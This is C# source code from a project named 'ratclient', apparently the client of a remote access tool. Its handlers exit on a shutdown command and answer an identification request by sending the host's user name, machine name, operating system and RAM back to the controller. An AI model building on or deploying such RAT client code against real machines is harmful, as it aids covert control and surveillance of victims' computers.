using Microsoft.VisualBasic.Devices;
using ratclient.Networking;
using ratclient.Packets;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace ratclient.Handlers
{
    public partial class CommandHandler
    {
        [DllImport("kernel32.dll")]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool GetPhysicallyInstalledSystemMemory(out long TotalMemoryInKilobytes);

        public static void HandleCommand(Client client, DoShutdownPacket packet)
        {
            if (Application.MessageLoop)
            {
                Application.Exit();
            }
            else
            {
                Environment.Exit(0);
            }
        }

        public static void HandleCommand(Client client, IdentificationPacket packet)
        {
            string userName = Environment.UserName;

            string osFriendlyName = new ComputerInfo().OSFullName;
            string architecture = Environment.Is64BitOperatingSystem ? " (x64)" : " (x86)";
            osFriendlyName = osFriendlyName + architecture;

            string machineName = Environment.MachineName;

            string ram = "";
            long lRam = 0L;
            GetPhysicallyInstalledSystemMemory(out lRam);
            ram = string.Format("{0}Gb", (double)lRam / 1024d / 1024d);

            string version = Program.version;

            client.Send(
                new IdentificationPacket()
                {
                    Name = userName,
                    MachineName = machineName,
                    OperatingSystem = osFriendlyName,
                    RAM = ram,
                    Version = version
                }
            );
        }

        public static void HandleCommand(Client client, StringMessagePacket packet)
        {
            Console.WriteLine(packet.Message);
        }
    }
}
